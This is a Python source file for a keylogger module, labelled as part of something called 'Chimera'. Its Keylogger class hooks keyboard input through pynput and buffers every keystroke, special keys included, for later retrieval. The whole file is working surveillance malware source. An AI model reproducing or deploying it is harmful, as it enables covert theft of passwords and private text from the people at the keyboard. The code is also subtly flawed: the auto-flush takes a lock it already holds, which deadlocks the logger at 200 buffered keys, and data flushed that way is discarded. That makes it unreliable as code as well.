"""
Chimera - Keylogger Module
Records keyboard input
"""
from pynput import keyboard
import threading
import time
import json

class Keylogger:
    def __init__(self):
        self.buffer = []
        self.running = False
        self.listener = None
        self.lock = threading.Lock()
        self.max_buffer = 200
    
    def start(self):
        """Start the keylogger"""
        self.running = True
        self.buffer = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        return True
    
    def _on_press(self, key):
        """Callback on key press"""
        if not self.running:
            return False
        
        try:
            if hasattr(key, 'char') and key.char:
                self._add_to_buffer(key.char)
            else:
                self._add_to_buffer(f"[{key}]")
        except:
            pass
        return True
    
    def _add_to_buffer(self, text):
        """Add text to buffer"""
        with self.lock:
            self.buffer.append(text)
            if len(self.buffer) >= self.max_buffer:
                self.flush()
    
    def flush(self):
        """Flush buffer and return data"""
        with self.lock:
            data = ''.join(self.buffer)
            self.buffer = []
            return data
    
    def get_data(self):
        """Get current buffer data"""
        return self.flush()
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        if self.listener:
            self.listener.stop()
        return self.flush()

